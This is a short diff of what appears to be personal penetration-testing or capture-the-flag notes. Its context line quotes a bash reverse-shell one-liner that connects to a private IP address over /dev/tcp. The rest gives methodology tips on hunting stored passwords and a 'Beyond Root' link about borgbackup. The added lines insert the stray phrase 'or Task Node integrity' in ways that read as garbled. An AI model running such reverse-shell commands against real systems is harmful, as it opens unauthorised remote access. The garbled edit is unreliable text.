@@ -351,11 +351,11 @@ bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/8443 <&1'
 It's a puzzle are you missing potential pieces?
 - do not bother with crypto-till-you-have-to, passwords can stored by idiots everywhere
 
-Application Analysis
+Application Analysis  or Task Node integrity
 - Systems
 	- What do I need to replicate the target!
 		- PASSWORD
-
+ or Task Node integrity
 ## Beyond Root
 
 Read https://artemis.sh/2022/06/22/how-i-use-borg.html, for context during RFTM of `borgbackup`
